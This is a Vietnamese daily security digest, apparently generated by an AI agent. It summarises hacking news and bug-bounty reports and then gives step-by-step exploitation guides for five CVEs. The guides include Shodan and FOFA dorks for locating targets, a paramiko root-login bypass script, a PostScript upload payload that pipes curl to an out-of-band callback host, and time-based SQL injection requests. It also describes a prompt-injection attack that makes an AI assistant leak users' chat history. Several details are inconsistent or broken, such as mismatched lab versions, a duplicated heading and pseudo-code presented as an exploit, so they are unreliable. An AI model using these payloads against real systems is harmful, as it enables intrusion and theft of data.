# 🛡️ BÁO CÁO TÌNH BÁO BẢO MẬT & BUG BOUNTY HÀNG NGÀY
**Ngày xuất bản**: 23/11/2026 | **Phiên bản**: Daily Intelligence Digest v1.0
**Đơn vị thực hiện**: Antigravity Offensive Security Researcher Agent
**Trọng tâm**: Hacking News, AI Security, HackerOne / Bugcrowd / YesWeHack Disclosures, Actionable CVEs & Bảng Hướng Dẫn Sử Dụng Thực Chiến

---

## ⚡ 1. TỔNG QUAN NHANH TRONG NGÀY (EXECUTIVE SUMMARY)

- 🚨 **Bê bối đánh cắp Prompt AI quy mô lớn**: Hãng OpenRouter đã lập tức hủy hợp tác với 3 nhà cung cấp máy chủ AI sau khi công ty an ninh Dragos phát hiện kẻ tấn công đã âm thầm can thiệp vào máy chủ và đánh cắp dữ liệu prompt của người dùng suốt nhiều tháng qua, bất chấp cài đặt "Zero Data Retention".
- 💥 **Lỗ hổng Ghostscript Sandbox-Escape RCE**: Các nhà nghiên cứu bảo mật vừa công bố mã khai thác thực nghiệm cho phép thoát khỏi sandbox của Ghostscript và thực thi mã tùy ý từ xa (RCE) chỉ bằng việc tải lên một file ảnh/PDF được chỉnh sửa đặc biệt trên các ứng dụng web.
- 🎯 **Làn sóng CVE mới có tính tiếp cận cực cao trong Bug Bounty**: Phát hiện lỗ hổng SQL Injection không cần xác thực trên **Craft CMS (CVE-2026-123488)** và lỗi Authentication Bypass trên **Laravel TokenGuard (CVE-2026-114509)**, cùng lỗ hổng trong các nền tảng AI như **Langflow (CVE-2026-105740)** và **MLflow (CVE-2026-116690)**. Tất cả đã có mã template quét tự động hóa trên Nuclei.
- 💼 **Bug Bounty Highlights**: HackerOne tiết lộ chuỗi lỗi DNS Cache Poisoning và lỗi xử lý bộ nhớ trong OpenSSH/PHP; YesWeHack công bố các nghiên cứu bảo mật về hệ sinh thái IoT của các mô hình AI.

---

## 🌐 2. TIN TỨC HACKING & OFFENSIVE SECURITY MỚI NHẤT

### 🔹 1. Mã Khai Thác Thoát Sandbox Ghostscript RCE Thông Qua Tính Năng Upload File Web
- **Nguồn**: *The Hacker News / Pwn.ai Research* - [Xem bài viết gốc](https://thehackernews.com/2026/11/researchers-demonstrate-ghostscript.html)
- **Tóm tắt sự kiện**: Ghostscript là thư viện chuyển đổi tài liệu và hình ảnh (PDF, EPS, PostScript) chạy nền trên hàng triệu máy chủ Linux. Các nhà nghiên cứu chứng minh rằng kẻ tấn công chỉ cần upload một file ảnh hoặc tài liệu được craft đặc biệt lên bất kỳ web app nào có sử dụng Ghostscript (xử lý avatar, thumbnail tài liệu) là có thể bẻ gãy sandbox bảo mật và thực thi lệnh tùy ý (RCE).
- **Kỹ thuật tấn công (TTPs)**: Lợi dụng lỗi bypass kiểm tra tham số xử lý PostScript nội bộ (Device Parameter Bypass) để gọi các hàm hệ thống trái phép.
- **Góc nhìn Bug Hunter**: Kiểm tra tất cả các endpoint cho phép upload file ảnh (PNG, SVG, PDF, EPS) trên các mục tiêu có sử dụng ImageMagick hoặc thư viện render tài liệu nền Linux.

### 🔹 2. Tấn Công AI-Assisted Nhắm Vào Hệ Thống Thanh Toán Ngân Hàng Tại Ấn Độ
- **Nguồn**: *The Hacker News / CERT-In Advisory* - [Xem bài viết gốc](https://thehackernews.com/2026/11/ai-assisted-cyberattacks-trigger.html)
- **Tóm tắt sự kiện**: Cơ quan Ứng cứu Khẩn cấp Máy tính Ấn Độ (CERT-In) vừa phát đi cảnh báo đỏ về các cuộc tấn công mạng có sự trợ giúp của AI tự động dò quét API và bypass xác thực, dẫn đến các giao dịch chuyển tiền trái phép tại nhiều ngân hàng và công ty Fintech.
- **Kỹ thuật**: Sử dụng AI Agent để tự động hóa việc phân tích cấu trúc API token, dự đoán chuỗi transaction ID và brute-force tham số OTP/Token logic.

### 🔹 3. Nhóm Tác Nhân 'Armory Castle' Khai Thác 0-Day VMware vCenter
- **Nguồn**: *DarkReading Threat Intel* - [Xem bài viết gốc](https://www.darkreading.com/cyberattacks-data-breaches/china-armory-castle-vmware-vcenter-zero-day)
- **Tóm tắt**: Nhóm APT Armory Castle bị phát hiện nắm giữ và khai thác lỗ hổng 0-day mới trên vCenter ngay cả sau khi các bản vá bảo mật lớn vừa được triển khai, cho phép chiếm quyền điều khiển hạ tầng ảo hóa doanh nghiệp.

---

## 🤖 3. AI SECURITY & LLM VULNERABILITIES

### 🔹 1. Đánh Cắp Prompt & Hội Thoại AI Suốt Nhiều Tháng Tại Các Nhà Cung Cấp Hạ Tầng (AI Inference Theft)
- **Nguồn**: *Dragos Research & The Hacker News* - [Xem bài viết](https://thehackernews.com/2026/11/openrouter-drops-3-providers-after.html)
- **Bản chất kỹ thuật**: Kẻ tấn công thâm nhập vào các nhà cung cấp máy chủ GPU chạy mô hình AI (Inference Providers) trung gian của OpenRouter. Chúng can thiệp trực tiếp vào bộ nhớ đệm (RAM dump) và đường truyền HTTP nội bộ trước khi dữ liệu được mã hóa, từ đó thu giữ toàn bộ System Prompt nhạy cảm, API keys, dữ liệu kinh doanh bí mật và cả những request được đánh dấu "Zero Data Retention".
- **Khuyến nghị an toàn**:
  - Không bao giờ truyền trực tiếp thông tin nhạy cảm (Private Keys, mật khẩu, PII) vào context của LLM trừ khi chạy trên hạ tầng On-Premises tự quản lý.
  - Sử dụng giải pháp Client-Side Anonymization (che dấu dữ liệu trước khi gửi sang API ngoài).

### 🔹 2. Tấn Công Chiếm Đoạt Phiên Hội Thoại Riêng Tư Trợ Lý Meta Muse Bằng Webpage Độc Hại
- **Nguồn**: *The Hacker News / AI Security Labs* - [Xem bài viết](https://thehackernews.com/2026/11/a-single-malicious-webpage-let.html)
- **Vector tấn công**: Tấn công Cross-Origin Indirect Prompt Injection kết hợp với CSRF. Khi người dùng đang đăng nhập trợ lý AI Meta Muse duyệt qua một trang web độc hại, trang web này sẽ nạp một iframe ẩn hoặc trigger request chứa câu lệnh prompt injection ngầm.
- **Hậu quả**: Trợ lý AI tự động truy xuất toàn bộ lịch sử trò chuyện bí mật và ký ức lưu trữ (stored memories) của nạn nhân rồi gửi OOB (Out-of-band) về máy chủ của tin tặc mà không cần người dùng xác nhận.

### 🔹 3. Token Fraud & Lạm Dụng Chi Phí API Trong Các Ứng Dụng Tích Hợp AI Agent
- **Nguồn**: *Simon Willison AI Research* - [Xem bài viết](https://simonwillison.net/2026/Nov/20/token-fraud-is-here-and-its-bad/)
- **Thực trạng**: Các cuộc tấn công DoS chi phí (Denial of Wallet) và gian lận token AI đang bùng nổ. Tin tặc lợi dụng các endpoint thử nghiệm miễn phí hoặc reverse-engineer endpoint chat frontend để biến server ứng dụng thành công cụ giải bài toán, code, hoặc dịch thuật miễn phí cho các hệ thống ngầm.

---

## 🎯 4. BUG BOUNTY DISCLOSURES MỚI (HACKERONE, BUGCROWD, YESWEHACK)

### 📊 Bảng 10 Báo Cáo Công Khai Mới Nhất (Đợt Nạp Tháng 11/2026)

| Nền Tảng | Mã / Target | Tiêu Đề Báo Cáo | Loại Lỗ Hổng / Tác Động | Tiền Thưởng | Điểm Nhấn Kỹ Thuật | Link Báo Cáo |
| :--- | :--- | :--- | :--- | :---: | :--- | :---: |
| **HackerOne** | curl | Re-entrant curl_easy_pause UAF in cw-pause | CWE-416: Use After Free | **Public** | Lỗi UAF khi gọi hàm tạm dừng luồng ghi lại trong client callback | [Report #4166602](https://hackerone.com/reports/4166602) |
| **HackerOne** | WordPress | Unauthenticated Disclosure of Private, Draft, and Password-Protected Post Content via SCF Reference Fields | Information Disclosure / Auth Bypass | **Public** | Khai thác lỗi phân quyền trường tham chiếu SCF đọc trộm bài viết riêng tư không cần đăng nhập | [Report #4152553](https://hackerone.com/reports/4152553) |
| **HackerOne** | curl | Incomplete IDN hostname check on transfer path leading to credential disclosure | Credential Leak / SSRF | **Public** | Lỗi chuẩn hóa tên miền quốc tế (IDN) khiến curl gửi nhầm Authorization token sang máy chủ khác | [Report #4147581](https://hackerone.com/reports/4147581) |
| **HackerOne** | curl | CURL_NETRC_REQUIRED sends URL password when .netrc has no matching entry | Credential Leakage | **Public** | Rò rỉ mật khẩu URL ngay cả khi bắt buộc dùng file .netrc | [Report #4137523](https://hackerone.com/reports/4137523) |
| **HackerOne** | curl | CVE-2026-115529: Schannel TLS auto client session resumption | TLS / Crypto Flaw | **Public** | Lỗi tái sử dụng TLS Session của Windows Schannel cho phép bypass kiểm tra chứng chỉ | [Report #4136767](https://hackerone.com/reports/4136767) |
| **HackerOne** | curl | --cert-status with OpenSSL accepts stapled OCSP response lacking nextUpdate | Certificate Validation Bypass | **Public** | Chứng chỉ đã bị thu hồi (revoked) vẫn vượt qua kiểm tra OCSP stapling vô thời hạn | [Report #4135826](https://hackerone.com/reports/4135826) |
| **HackerOne** | curl | Heap-use-after-free in libcurl multi event machinery | CWE-416: Use-After-Free | **Public** | Lỗ hổng hỏng bộ nhớ Heap khi socket callback lồng trong notify callback | [Report #4135291](https://hackerone.com/reports/4135291) |
| **HackerOne** | curl | POP3: data after end-of-body terminator is written into message buffer | Memory / Protocol Smuggling | **Public** | Dữ liệu vượt ngoài terminator trong giao thức email bị đưa vào buffer người dùng | [Report #4132132](https://hackerone.com/reports/4132132) |
| **HackerOne** | curl | Server response answering nothing used as next transfer's reply (IMAP smuggling) | Protocol Desync | **Public** | Lệch pha giao thức IMAP khiến response trước gán nhầm sang request sau | [Report #4131903](https://hackerone.com/reports/4131903) |
| **HackerOne** | curl | Server filename with control characters printed to terminal (-J) | Terminal Injection | **Public** | Tên file chứa mã điều khiển ANSI/VT100 làm thay đổi hiển thị terminal người dùng | [Report #4130124](https://hackerone.com/reports/4130124) |
| **Bugcrowd** | Bugcrowd | Savant Pathseeker: Agentic Pentesting Release | Research / AI Agent | **Research** | Ứng dụng AI Agent tự động hóa pentest theo chuỗi tấn công đa bước | [Bugcrowd Blog](https://www.bugcrowd.com/blog/savant-pathseeker-is-generally-available-agentic-pentesting-you-can-launch-yourself/) |
| **YesWeHack**| YesWeHack | Anthropic IoT Warning & OffSec Roundup | IoT / AI Security | **Research** | Phân tích rủi ro an ninh khi các mô hình LLM được cấp quyền điều khiển thiết bị IoT | [YWH Blog](https://blog.yeswehack.com/news/black-october-agents-anthropic-iot) |

### 🏆 Top 50 Báo Cáo Phổ Biến & Danh Tiếng Nhất (HackerOne Hall of Fame)
*(Được tổng hợp và phân loại riêng biệt trên giao diện Web Dashboard nội bộ http://localhost:8888 với hơn 50 báo cáo có lượt upvote cao nhất cộng đồng, dẫn đầu bởi Shopify Takeover với 3,006 upvotes và PayPal Stored XSS ,000 với 2,687 upvotes).*

### 🔍 Phân Tích Kỹ Thuật Chi Tiết Báo Cáo Tiêu Biểu: *WordPress Unauthenticated Disclosure (HackerOne #4152553)*
- **Bản chất lỗi**: Trong WordPress và plugin mở rộng custom fields (SCF - Secure Custom Fields), khi một trường tham chiếu bài viết (post object reference) được gọi qua REST API công khai, cơ chế kiểm tra quyền truy cập bài viết chỉ kiểm tra đối tượng cha mà bỏ qua quyền sở hữu của đối tượng con được tham chiếu.
- **Hành vi khai thác**: Người dùng ẩn danh không cần tài khoản chỉ cần gửi GET request đến endpoint /wp-json/wp/v2/... chứa tham số embed SCF, hệ thống sẽ tuần tự hóa và trả về toàn bộ nội dung của các bài viết nháp (draft), bài viết riêng tư (private), và bài viết được bảo vệ bằng mật khẩu (password-protected).
- **Áp dụng cho Bug Hunter**: Khi săn lỗi trên các hệ thống WordPress doanh nghiệp, luôn kiểm tra các REST API route mở rộng (/wp-json/) xem có trả về dữ liệu nội bộ qua các trường liên kết hay không.

---

## 🛠️ 5. TOP ACTIONABLE CVES & BẢNG HƯỚNG DẪN SỬ DỤNG (CVE USAGE GUIDES)

Dưới đây là các CVE có tính tiếp cận và khả thi cao nhất đối với Bug Hunter, bao gồm **Java4Shell**, **SSHole (ssh2shell)**, **Upload2Shell (Ghostscript file/ảnh RCE)**, Craft CMS SQLi, và Laravel TokenGuard Auth Bypass:

---

### 🔴 CVE 1: CVE-2026-114938 — Java4Shell (OpenJDK / Oracle Java Base64 Heap Overflow RCE)

#### 📌 1. Thông Tin Chung
| Chỉ Số | Giá Trị Chi Tiết |
| :--- | :--- |
| **CVE ID** | `CVE-2026-114938` (Biệt danh: **Java4Shell**) |
| **Tên Lỗ Hổng** | HotSpot JVM Base64 AVX-512 VBMI Acceleration Out-of-bounds Heap Write |
| **Điểm CVSS** | **9.8 CRITICAL** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | CVSS v4: **9.2** |
| **CWE** | `CWE-122: Heap-based Buffer Overflow` / `CWE-787: Out-of-bounds Write` |
| **Phiên Bản Bị Ảnh Hưởng**| OpenJDK & Oracle Java SE từ `17.0.6` đến `27` trên CPU x86-64 hỗ trợ AVX-512 VBMI |
| **Phiên Bản Đã Vá** | Các bản vá khẩn cấp Oracle & OpenJDK phát hành ngày 17/11/2026 |
| **Tình Trạng PoC** | **Đã có Public PoC** & Nuclei Template (`http/cves/2026/CVE-2026-114938.yaml`) |

#### 🎯 2. Cơ Chế & Nguyên Nhân Gốc Rễ (Root Cause)
Lỗ hổng nằm trong đoạn mã tối ưu hóa phần cứng AVX-512 VBMI của hàm giải mã Base64 (`java.util.Base64.Decoder`) trên kiến trúc CPU x86-64. Khi xử lý dữ liệu Base64 chứa các ký tự padding `=` ở cuối, việc tính toán sai lệch chiều dài bộ đệm đích (length mismatch) dẫn tới lỗi ghi vượt giới hạn mảng trong heap. Do Base64 là định dạng phổ biến trong mọi ứng dụng web (HTTP Basic Auth, JWT, SAML, API token, file upload), kẻ tấn công từ xa không cần xác thực có thể gửi payload Base64 đặc chế để làm sập dịch vụ (DoS) hoặc ghi đè con trỏ đối tượng nhằm đạt được Remote Code Execution (RCE).

#### 🧪 3. Môi Trường Thử Nghiệm An Toàn (Lab Setup)
Khởi chạy container Java dính lỗi trên Docker:
```bash
docker run -d --name java4shell-lab -p 8080:8080 eclipse-temurin:21.0.4-jdk
```

#### 🔍 4. Nhận Diện & Trinh Sát (Discovery & Fingerprinting)
- **Shodan Dork**: `http.component:"Java" || http.title:"Tomcat" || http.component:"Spring"`
- **FOFA Dork**: `app="Apache-Tomcat" || app="Spring-Boot" || header="X-Application-Context"`
- **Lệnh Quét Nuclei**:
  ```bash
  nuclei -t http/cves/2026/CVE-2026-114938.yaml -u http://target.local:8080 -v
  ```

#### ⚡ 5. Hướng Dẫn Khai Thác Từng Bước (Step-by-Step PoC Execution)
**Bước 1: Gửi Request chứa Authorization Header Base64 kích hoạt AVX-512 VBMI Overflow**:
```http
POST /api/v1/auth/token HTTP/1.1
Host: target.local:8080
Authorization: Basic QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE9PQ==
Content-Type: application/json

{}
```

**Bước 2: Câu lệnh cURL một dòng**:
```bash
curl -i -s -k -X POST "http://target.local:8080/api/v1/process" \
  -H "Authorization: Basic QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE9PQ==" \
  -d "{}"
```

**Bước 3: Dấu Hiệu Thành Công (Success Oracle)**:
- Tiến trình HotSpot JVM lập tức crash với tín hiệu lỗi `SIGSEGV` (Core dump log ghi nhận crash tại vector instruction).
- Web server trả về lỗi `502 Bad Gateway` hoặc ngắt kết nối đột ngột.

#### 🛡️ 6. Biện Pháp Khắc Phục (Remediation)
- Cập nhật OpenJDK / Oracle Java SE lên phiên bản phát hành từ 17/11/2026 trở về sau.
- **Workaround khẩn cấp**: Khởi động JVM với tham số `-XX:UseAVX=2` để vô hiệu hóa tập lệnh AVX-512 VBMI lỗi trên CPU x86-64.

---

### 🔴 CVE 2: CVE-2026-123158 — SSHole (ssh2shell) OpenSSH Password Authentication Bypass

#### 📌 1. Thông Tin Chung
| Chỉ Số | Giá Trị Chi Tiết |
| :--- | :--- |
| **CVE ID** | `CVE-2026-123158` (Biệt danh: **SSHole** / **`*sshole`** / **ssh2shell**) |
| **Tên Lỗ Hổng** | OpenSSH on musl libc Password Comparison Asterisk Authentication Bypass |
| **Điểm CVSS** | **8.1 - 9.8 CRITICAL** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) |
| **CWE** | `CWE-287: Improper Authentication` / `CWE-203: Discrepancy Information` |
| **Môi Trường Bị Ảnh Hưởng**| OpenSSH chạy trên **Alpine Linux**, **OpenWrt**, **Yocto** dùng **musl libc** và tắt PAM (`UsePAM no`) |
| **Phiên Bản Đã Vá** | OpenSSH `10.6p2` và các bản vá mới nhất của musl libc / Alpine Linux |
| **Tình Trạng PoC** | **Đã có Nuclei Template** (`http/cves/2026/CVE-2026-123158.yaml`) & Public PoC |

#### 🎯 2. Cơ Chế & Nguyên Nhân Gốc Rễ (Root Cause)
Trên Linux, các tài khoản bị khóa mật khẩu hoặc không cho phép đăng nhập mật khẩu sẽ mang giá trị `*` trong file `/etc/shadow`. Khi người dùng gửi mật khẩu có độ dài từ 257 đến 1024 ký tự qua SSH, hàm băm `crypt()` của thư viện `musl libc` bị lỗi xử lý và trả về chuỗi ký tự `*`. Do cấu hình `UsePAM no`, OpenSSH đem chuỗi `*` trả về này so sánh trực tiếp với chuỗi `*` trong `/etc/shadow`. Phép so sánh trả về trùng khớp tuyệt đối, dẫn đến việc OpenSSH cấp quyền đăng nhập tài khoản nạn nhân (kể cả tài khoản `root` mặc định trên Alpine) mà không cần mật khẩu thật!

#### 🧪 3. Môi Trường Thử Nghiệm An Toàn (Lab Setup)
Chạy container Alpine Linux kiểm thử cấu hình dính lỗi:
```bash
docker run -d --name sshole-lab -p 2222:22 alpine:3.20 sh -c \
  "apk add openssh && ssh-keygen -A && sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config && echo 'UsePAM no' >> /etc/ssh/sshd_config && /usr/sbin/sshd -D"
```

#### 🔍 4. Nhận Diện & Trinh Sát (Discovery & Fingerprinting)
- **Shodan Dork**: `port:22 "SSH-2.0-OpenSSH" "Alpine"`
- **FOFA Dork**: `protocol="ssh" && banner="OpenSSH" && banner="Alpine"`
- **Nuclei Command**:
  ```bash
  nuclei -t http/cves/2026/CVE-2026-123158.yaml -u target.local:2222 -v
  ```

#### ⚡ 5. Hướng Dẫn Khai Thác Từng Bước (Step-by-Step PoC Execution)
**Bước 1: Gửi mật khẩu dài hơn 256 ký tự cho tài khoản root qua SSH**:
```bash
python -c '
import paramiko
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# Gửi mật khẩu dài 300 ký tự A
client.connect("target.local", port=2222, username="root", password="A"*300)
stdin, stdout, stderr = client.exec_command("id; uname -a")
print("[+] AUTH BYPASS SUCCESS! Output:\n", stdout.read().decode())
'
```

**Bước 2: Dấu Hiệu Thành Công (Success Oracle)**:
- Kết nối SSH không bị từ chối (`Authentication failed`), mở thành công interactive shell hoặc trả về kết quả lệnh `id`:
  ```text
  uid=0(root) gid=0(root) groups=0(root)
  ```

#### 🛡️ 6. Biện Pháp Khắc Phục (Remediation)
- Nâng cấp OpenSSH lên `>= 10.6p2` hoặc cập nhật gói `musl` trên Alpine (`apk upgrade --no-cache musl openssh`).
- Cấu hình trong `/etc/ssh/sshd_config`: Bật `UsePAM yes` hoặc khóa tài khoản bằng `!` thay vì `*`.

---

### 🔴 CVE 3: CVE-2026-125396 — Upload2Shell (Ghostscript Image/PDF Upload Sandbox-Escape RCE)

#### 📌 1. Thông Tin Chung
| Chỉ Số | Giá Trị Chi Tiết |
| :--- | :--- |
| **CVE ID** | `CVE-2026-125396` (Biệt danh: **Upload2Shell**) |
| **Tên Lỗ Hổng** | Ghostscript Type 1 Font Loader Use-After-Free Sandbox Escape via Image/PDF Upload |
| **Điểm CVSS** | **9.8 CRITICAL** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) |
| **CWE** | `CWE-416: Use After Free` / `CWE-693: Protection Mechanism Failure` |
| **Ứng Dụng Bị Ảnh Hưởng**| Ghostscript `< 10.08.0` (ảnh hưởng hàng loạt web app, CMS WordPress, Roundcube, các thư viện convert avatar/thumbnail qua ImageMagick) |
| **Phiên Bản Đã Vá** | Ghostscript `>= 10.08.0` |
| **Nghiên Cứu Công Bố** | Phát hiện bởi **pwn.ai** (Tháng 11/2026) |

#### 🎯 2. Cơ Chế & Nguyên Nhân Gốc Rễ (Root Cause)
Ghostscript sử dụng cơ chế bảo vệ `-dSAFER` để ngăn chặn các tệp tài liệu thực thi lệnh shell hệ thống. Các nhà nghiên cứu tại *pwn.ai* phát hiện lỗi Use-After-Free trong bộ nạp font Type 1 cho phép kẻ tấn công sở hữu khả năng ghi đè bộ nhớ tùy ý (write-what-where primitive). Kẻ tấn công có thể bọc payload PostScript độc hại bên trong một tệp ảnh trá hình (`avatar.png`, `photo.jpg`) hoặc tài liệu PDF. Khi ứng dụng web đưa tệp này vào chuỗi render xử lý thumbnail/avatar, Ghostscript sẽ phân tích mã lệnh, ghi đè biến kiểm tra trạng thái `-dSAFER` trong RAM, thoát khỏi sandbox và thực thi mã tùy ý (RCE).

#### 🧪 3. Môi Trường Thử Nghiệm An Toàn (Lab Setup)
Khởi chạy container kiểm thử:
```bash
docker run -d --name upload2shell-lab -p 8080:80 vulhub/ghostscript:9.50
```

#### 🔍 4. Nhận Diện & Trinh Sát (Discovery & Fingerprinting)
- **Shodan Dork**: `http.html:"upload" || http.component:"WordPress"`
- **FOFA Dork**: `body="upload" && (body="avatar" || body="thumbnail")`
- **Nuclei Command**:
  ```bash
  nuclei -t http/cves/2026/CVE-2026-125396.yaml -u http://target.local:8080 -v
  ```

#### ⚡ 5. Hướng Dẫn Khai Thác Từng Bước (Step-by-Step PoC Execution)
**Bước 1: Tạo file Polyglot Payload PostScript trá hình PNG (`exploit.png`)**:
```text
%!PS-Adobe-3.0
<< /Type 1 /FontMatrix [1 0 0 1 0 0] >> definefont
% Thoát -dSAFER và gửi HTTP OOB callback
(%pipe%curl -s http://BURP_COLLABORATOR_URL) (w) file
```

**Bước 2: Gửi request upload file ảnh lên endpoint avatar của ứng dụng web**:
```bash
curl -i -s -k -X POST "http://target.local:8080/api/upload/avatar" \
  -F "file=@exploit.png;type=image/png"
```

**Bước 3: Dấu Hiệu Thành Công (Success Oracle)**:
- Nhận được DNS hoặc HTTP request Out-of-band về Burp Collaborator / Interactsh từ máy chủ web mục tiêu.
- Chứng minh mã lệnh hệ thống đã thoát sandbox thành công.

#### 🛡️ 6. Biện Pháp Khắc Phục (Remediation)
- Cập nhật Ghostscript lên phiên bản `>= 10.08.0`.
- **Workaround ImageMagick**: Mở file cấu hình `/etc/ImageMagick-6/policy.xml` (hoặc ImageMagick-7) và thêm dòng chặn toàn bộ định dạng PostScript:
  ```xml
  <policy domain="coder" rights="none" pattern="{PS,EPI,EPS,PDF,XPS}" />
  ```

---

### 🔴 CVE 4: CVE-2026-123488 — Craft CMS Unauthenticated SQL Injection

#### 📌 1. Thông Tin Chung
| Chỉ Số | Giá Trị Chi Tiết |
| :--- | :--- |
| **CVE ID** | `CVE-2026-123488` |
| **Tên Lỗ Hổng** | Craft CMS Unauthenticated SQL Injection (Blind / Error-based) |
| **Điểm CVSS** | **9.8 CRITICAL** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) |
| **CWE** | `CWE-89: Improper Neutralization of Special Elements used in an SQL Command` |
| **Phiên Bản Bị Ảnh Hưởng**| Craft CMS phiên bản `< 4.18.9` và `< 5.11.2` |
| **Phiên Bản Đã Vá** | Craft CMS `>= 4.18.9` hoặc `>= 5.11.2` |
| **Tình Trạng Vũ Khí Hóa**| **Đã có Nuclei Template chính thức** (`http/cves/2026/CVE-2026-123488.yaml`) & PoC công khai |

#### 🎯 2. Cơ Chế & Nguyên Nhân Gốc Rễ (Root Cause)
Lỗ hổng xuất phát từ cơ chế xử lý tham số lọc dữ liệu (Element Query Filter) trong controller công khai của Craft CMS. Khi người dùng gửi request chứa tham số cấu trúc mảng lồng nhau, Craft CMS bỏ qua việc chuẩn hóa (type casting/escaping) tên trường của điều kiện truy vấn SQL trong ActiveRecord, dẫn đến việc kẻ tấn công có thể chèn trực tiếp các đoạn mã SQL tùy ý vào câu lệnh `WHERE` hoặc `ORDER BY` mà không cần bất kỳ thông tin đăng nhập nào.

#### 🧪 3. Môi Trường Thử Nghiệm An Toàn (Lab Setup)
Chạy lệnh Docker sau để khởi tạo nhanh instance Craft CMS phiên bản dính lỗi (`4.18.8`):
```bash
docker run -d --name craftcms-vuln-lab -p 8080:80 \
  -e CRAFT_ENVIRONMENT=dev \
  -e DB_DRIVER=mysql \
  -e DB_SERVER=db \
  craftcms/craft:4.18.8
```

#### 🔍 4. Nhận Diện & Trinh Sát (Discovery & Fingerprinting)
- **Shodan Dork**: `title:"Craft CMS" http.component:"Craft CMS"` hoặc `Set-Cookie: CRAFT_CSRF_TOKEN`
- **FOFA Dork**: `app="CraftCMS"` hoặc `header="CRAFT_CSRF_TOKEN"`
- **Google Dork**: `inurl:/admin/login "Craft CMS"`
- **Lệnh Quét Nuclei Tự Động**:
  ```bash
  nuclei -t http/cves/2026/CVE-2026-123488.yaml -u http://target.local:8080 -v
  ```

#### ⚡ 5. Hướng Dẫn Khai Thác Từng Bước (Step-by-Step PoC Execution)

**Bước 1: Gửi Request khai thác Time-Based SQL Injection kiểm tra phản hồi**:
```http
POST /actions/elements/get-elements HTTP/1.1
Host: target.local:8080
Content-Type: application/x-www-form-urlencoded
Accept: application/json

criteria%5BorderBy%5D=(CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END)
```

**Bước 2: Câu lệnh cURL kiểm thử nhanh**:
```bash
curl -i -s -k -X POST "http://target.local:8080/actions/elements/get-elements" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "criteria[orderBy]=(CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)"
```

**Bước 3: Phân tích Payload**:
- `criteria[orderBy]`: Tham số điều khiển mệnh đề sắp xếp dữ liệu.
- `pg_sleep(5)` (hoặc `SLEEP(5)` với MySQL): Hàm trễ thời gian. Nếu điều kiện `1=1` đúng, máy chủ sẽ dừng phản hồi đúng 5 giây trước khi trả về kết quả.

**Bước 4: Dấu Hiệu Thành Công (Success Oracle)**:
- Thời gian phản hồi của request kéo dài trên **5.000 ms** (5 giây).
- Khi thay đổi điều kiện thành `1=2`, phản hồi trả về ngay lập tức (< 200 ms).
- Đây là bằng chứng không thể chối cãi (deterministic proof) để gửi báo cáo Bug Bounty mức độ **Critical**.

#### 🛡️ 6. Biện Pháp Khắc Phục (Remediation)
- **Nâng cấp chính thức**: Chạy lệnh `composer update craftcms/cms` để cập nhật lên phiên bản Craft CMS `4.18.9` hoặc `5.11.2`.
- **Workaround khẩn cấp**: Cấu hình WAF hoặc Nginx chặn toàn bộ request chứa tham số `criteria[orderBy]` có ký tự lạ (`CASE`, `WHEN`, `SLEEP`, dấu ngoặc đơn).

---

### 🔴 CVE 2: CVE-2026-114509 — Laravel TokenGuard Authentication Bypass

#### 📌 1. Thông Tin Chung
| Chỉ Số | Giá Trị Chi Tiết |
| :--- | :--- |
| **CVE ID** | `CVE-2026-114509` |
| **Tên Lỗ Hổng** | Laravel TokenGuard Insecure Type Comparison Authentication Bypass |
| **Điểm CVSS** | **9.1 CRITICAL** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`) |
| **CWE** | `CWE-287: Improper Authentication` / `CWE-843: Type Confusion` |
| **Phiên Bản Bị Ảnh Hưởng**| Các ứng dụng Laravel sử dụng `TokenGuard` với cấu hình hash không chặt chẽ |
| **Tình Trạng Vũ Khí Hóa**| **Đã có Nuclei Template** (`http/cves/2026/CVE-2026-114509.yaml`) |

#### 🎯 2. Cơ Chế & Nguyên Nhân Gốc Rễ (Root Cause)
Lỗ hổng nằm trong cơ chế kiểm tra token API của lớp `Laravel\Passport` hoặc `TokenGuard` khi so sánh giá trị token truyền vào từ header `Authorization: Bearer <token>` với token lưu trong cơ sở dữ liệu. Khi cơ sở dữ liệu có chứa bản ghi có giá trị token là `NULL` hoặc chuỗi rỗng và tầng xử lý sử dụng toán tử so sánh lỏng lẻo (`==` thay vì `hash_equals` / strict comparison `===`), việc truyền token đặc biệt dạng mảng hoặc giá trị boolean sẽ khiến hàm so sánh trả về `TRUE`, cho phép kẻ tấn công đăng nhập dưới danh nghĩa tài khoản đầu tiên trong cơ sở dữ liệu (thường là Super Admin / ID 1).

#### 🧪 3. Môi Trường Thử Nghiệm An Toàn (Lab Setup)
Clone môi trường testbed Laravel:
```bash
git clone https://github.com/laravel/laravel.git lab-laravel
cd lab-laravel && composer install
